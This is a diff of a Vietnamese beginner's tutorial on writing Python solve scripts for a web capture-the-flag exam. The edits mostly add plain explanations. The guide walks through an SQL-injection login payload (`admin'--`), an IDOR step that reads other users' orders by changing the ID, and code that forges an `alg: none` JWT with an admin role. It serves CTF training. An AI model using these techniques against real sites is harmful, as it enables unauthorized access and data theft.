@@ -1,4 +1,4 @@
-# Bắt đầu từ 0 — chưa biết Python, chưa biết exploit web
+# Bắt đầu từ 0 — chưa biết Python, chưa biết khai thác web (hack web)
 
 Đọc 1 lần trước ngày thi (15-20 phút). Sau bài này bạn sẽ hiểu đủ để đọc được mọi snippet trong các thư mục `01_` đến `08_` và tự sửa khi nó không chạy đúng.
 
@@ -133,7 +133,7 @@ for p in payloads:
 if r.status_code == 200:
     print("thành công")
 elif r.status_code == 403:
-    print("bị WAF chặn")
+    print("bị chặn (thường do WAF -- 1 lớp lọc tự động, thấy request khả nghi là chặn trước khi tới server thật)")
 else:
     print("mã khác:", r.status_code)
 ```
@@ -166,7 +166,7 @@ Khi quét 10-20 đội, 1 đội lỗi không được làm script dừng toàn 
 
 ```python
 import requests   # thư viện gửi HTTP request, phải cài trước: pip install requests
-import re         # thư viện regex, có sẵn trong Python, không cần cài
+import re         # thư viện "regex" (tìm chuỗi theo 1 mẫu, ví dụ tìm đúng dạng flag trong 1 đoạn text dài); có sẵn trong Python, không cần cài
 ```
 
 Lệnh cài thư viện (chạy 1 lần, cần làm **trước** ngày thi vì lúc thi không có Internet):
@@ -186,7 +186,7 @@ pip install requests beautifulsoup4
 | `IndentationError: expected an indented block` | Dòng sau `:` (sau `if`, `for`, `def`...) không lùi vào đủ khoảng trắng | Python dùng khoảng trắng đầu dòng để biết dòng nào "thuộc" khối nào — thụt vào đúng 4 dấu cách, nhất quán trong cả file |
 | `SyntaxError: invalid syntax` ở cuối dòng `if`/`for`/`def` | Quên dấu `:` ở cuối dòng | Thêm `:`, ví dụ `if r.status_code == 200:` |
 | `NameError: name 'r' is not defined` | Dùng biến `r` trước khi gán, hoặc gán ở dòng bên trong `try` nhưng lỗi xảy ra trước khi gán xong | In `r` ngay sau dòng gán để chắc nó tồn tại; kiểm tra thụt lề đúng hàm |
-| `SyntaxError: f-string: single '}' is not allowed` | Trong f-string có `{` hoặc `}` thật (ví dụ JSON) nhưng quên escape | Dùng `{{` và `}}` để in `{`/`}` thật trong f-string, hoặc dùng chuỗi thường + `.format()`/`%` |
+| `SyntaxError: f-string: single '}' is not allowed` | Trong f-string có dấu `{` hoặc `}` thật (ví dụ đang gõ JSON) nhưng Python lại hiểu nhầm đó là chỗ để nhúng biến | Gõ 2 dấu liền nhau `{{` và `}}` thay cho 1 dấu `{`/`}` thật, hoặc đổi sang chuỗi thường ghép bằng `+` |
 | `ModuleNotFoundError: No module named 'requests'` | Thư viện chưa cài, hoặc cài ở Python khác với Python đang chạy | `pip install requests`; nếu vẫn lỗi, thử `pip3 install requests` hoặc `python -m pip install requests` |
 | `TypeError: 'NoneType' object is not subscriptable` | Biến bằng `None` (ví dụ regex không match, `re.search(...)` trả `None`) mà vẫn gọi `.group()` hay `[...]` lên nó | Kiểm tra `if m:` trước khi dùng `m.group(...)` |
 | `KeyError: 'token'` | Dict không có key đó (response JSON thực tế khác với bạn đoán) | `print(r.json())` để xem đúng cấu trúc thật trước khi lấy key |
@@ -202,7 +202,7 @@ pip install requests beautifulsoup4
 
 ### Ví dụ 1 — chuỗi 3 request (login → lấy ID → IDOR)
 
-Giả sử bạn vừa giải tay 1 bài trên Burp, **3 bước**: (1) login bằng SQLi `admin'--`, (2) GET `/api/me` để lấy `user_id` của mình, (3) GET `/api/orders/{id}` với `id = user_id + 1` (IDOR) để đọc đơn hàng của người khác, trong đó có flag.
+Giả sử bạn vừa giải tay 1 bài trên Burp, **3 bước**: (1) login bằng SQLi (chèn 1 đoạn lệnh giả vào ô username để database hiểu nhầm là lệnh thật) `admin'--`, (2) GET `/api/me` để lấy `user_id` của mình, (3) GET `/api/orders/{id}` với `id = user_id + 1` để đọc đơn hàng của người khác (gọi là IDOR — chỉ cần đổi số ID trong URL là xem được dữ liệu người khác, đúng ra server phải chặn việc này), trong đó có flag.
 
 **Ghi lại chính xác 3 request đã chạy được trên Burp:**
 
@@ -248,8 +248,8 @@ def solve_one(session, base_url):
     except Exception:
         return None                    # không đọc được id, dừng, không đoán mò
 
-    # Request 3 trên Burp: GET /api/orders/{id khác mình} -- đây là bước IDOR
-    # id của request 3 LẤY TỪ KẾT QUẢ request 2, không hard-code 43 như lúc tay
+    # Request 3 trên Burp: GET /api/orders/{id khác mình} -- đây là bước IDOR (xem mô tả phía trên)
+    # id của request 3 LẤY TỪ KẾT QUẢ request 2, không gán cứng số 43 như lúc làm tay
     r3 = session.get(f"{base_url}/api/orders/{my_id + 1}", timeout=5)
 
     m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r3.text)
@@ -270,7 +270,7 @@ Chạy `python bai1.py`:
 
 ### Ví dụ 2 — có bước không phải request (tính toán cục bộ)
 
-Không phải lúc nào mọi bước cũng là "gửi request". Ví dụ: cookie `session` là 1 JWT dạng `header.payload.signature`, server quên kiểm `alg: none` — bạn đã test tay bằng cách tự sửa JWT (decode base64, đổi `"role":"user"` thành `"role":"admin"`, encode lại, bỏ signature) rồi dán cookie mới vào Burp và request `/admin` thành công.
+Không phải lúc nào mọi bước cũng là "gửi request". Ví dụ: cookie `session` là 1 JWT — hiểu đơn giản là "thẻ đăng nhập" dạng chữ, gồm 3 đoạn nối bằng dấu chấm (`phần1.phần2.phần3`): đoạn đầu ghi kiểu mã hoá, đoạn giữa ghi thông tin như vai trò (role), đoạn cuối là "con dấu" để chống bị sửa. Ở đây server quên kiểm con dấu khi đoạn đầu ghi "không mã hoá gì cả" (`alg: none`) — bạn đã test tay bằng cách tự sửa JWT (giải mã base64, đổi `"role":"user"` thành `"role":"admin"`, mã hoá lại, bỏ trống phần con dấu) rồi dán cookie mới vào Burp và request `/admin` thành công.
 
 Bước "sửa JWT" này **không gửi request nào cả** — nó là xử lý chuỗi thuần Python, chèn vào **giữa** 2 request:
 
@@ -291,12 +291,12 @@ def solve_one(session, base_url):
         return None
 
     # --- Bước tính toán cục bộ, KHÔNG có request nào ở đây ---
-    header_b64, payload_b64, _sig = token.split(".")
-    new_header = b64url_encode({"alg": "none", "typ": "JWT"})
+    header_b64, payload_b64, _con_dau_cu = token.split(".")   # cắt token thành 3 đoạn theo dấu chấm
+    new_header = b64url_encode({"alg": "none", "typ": "JWT"})  # đoạn đầu: khai "không mã hoá"
     payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
-    payload["role"] = "admin"               # sửa claim ngay trong Python, không qua Burp nữa
+    payload["role"] = "admin"               # sửa thông tin vai trò ngay trong Python, không qua Burp nữa
     new_payload = b64url_encode(payload)
-    forged_token = f"{new_header}.{new_payload}."   # alg=none -> signature để trống
+    forged_token = f"{new_header}.{new_payload}."   # alg=none -> bỏ trống đoạn "con dấu" cuối
     # --- Hết bước tính toán, giờ mới gửi request tiếp ---
 
     session.cookies.set("session", forged_token)
